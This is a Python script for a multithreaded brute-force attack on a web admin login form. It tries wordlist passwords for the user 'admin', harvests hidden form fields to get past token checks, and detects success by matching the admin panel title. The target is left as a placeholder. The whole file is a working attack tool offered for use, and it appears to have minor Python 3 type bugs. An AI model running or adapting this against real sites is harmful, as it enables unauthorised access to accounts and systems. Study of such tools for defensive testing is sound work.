from urllib.request import urlopen, Request, HTTPError, build_opener, HTTPCookieProcessor
from urllib.parse import urlencode
from http.cookiejar import FileCookieJar
from queue import Queue
import threading
import os
import sys
from html.parser import HTMLParser


############################
# global variables
############################

user_thread = 10
username = "admin"
wordlist_file = "./cain.txt"
resume = None

target_url = "YOUR_OWN_FAKE_SITE"
target_post = "YOUR_OWN_FAKE_SITE"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: %s" % username)

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = FileCookieJar("cookies")
            opener = build_opener(HTTPCookieProcessor(jar))

            response = opener.open(target_url)
            page = response.read()

            print("Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))

            # read hidden fields <input type="hidden">
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # add username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful!!!")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit...")

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value


def build_wordlist(wordlist_file):

    with open(wordlist_file, "rt") as fd:
        raw_words = fd.readlines()

    found_resume = False
    words = Queue()

    for word in raw_words:
        word = word.rstrip()

        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from %s" % resume)
        else:
            words.put(word)

    return words

############################
# main program starts here
############################

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
